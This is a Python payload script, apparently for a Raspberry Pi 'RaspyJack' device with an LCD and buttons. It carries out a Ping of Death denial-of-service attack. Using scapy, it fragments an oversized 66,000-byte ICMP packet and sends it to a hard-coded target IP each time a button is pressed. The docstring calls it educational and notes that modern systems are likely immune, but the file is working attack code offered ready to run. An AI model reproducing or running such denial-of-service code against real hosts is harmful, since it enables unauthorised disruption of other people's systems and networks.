#!/usr/bin/env python3
"""
RaspyJack *payload* – **DoS Attack: Ping of Death**
====================================================
A classic Denial of Service (DoS) attack that involves sending a
malformed, oversized ICMP packet (larger than the 65,535 byte limit).

When the target machine tries to reassemble the fragmented packet, it can
cause a buffer overflow and crash the operating system.

**!!! WARNING !!!**
This is a DENIAL OF SERVICE attack. It is highly unlikely to work on any
system made after ~1998 but is included for educational purposes.
"""

import os, sys, subprocess, signal, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    sys.exit(1)

# --- CONFIGURATION ---
TARGET_IP = "192.168.1.51"

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)

# --- Main ---
def show_message(lines, color="lime"):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    y = 40
    for line in lines:
        d.text((5, y), line, font=FONT_TITLE, fill=color)
        y += 15
    LCD.LCD_ShowImage(img, 0, 0)

def run_attack():
    show_message(["Sending Ping of", "Death packet..."], "yellow")
    
    try:
        # Create an oversized payload
        payload = 'A' * 66000 
        # Scapy's fragment() function will automatically break it into fragments
        frags = fragment(IP(dst=TARGET_IP)/ICMP()/payload)
        
        send(frags, verbose=0)
        show_message(["Packet sent!", "Check target", "for effect."], "lime")
        
    except Exception as e:
        show_message(["Attack FAILED!", str(e)[:20]], "red")
        print(f"Ping of Death failed: {e}", file=sys.stderr)

if __name__ == '__main__':
    try:
        show_message(["Ping of Death", f"Target: {TARGET_IP}", "Press OK to send."])
        while True:
            if GPIO.input(PINS["KEY3"]) == 0:
                break
            if GPIO.input(PINS["OK"]) == 0:
                run_attack()
                time.sleep(4)
                show_message(["Ready to attack", "again."])
            time.sleep(0.1)
            
    finally:
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Ping of Death payload finished.")
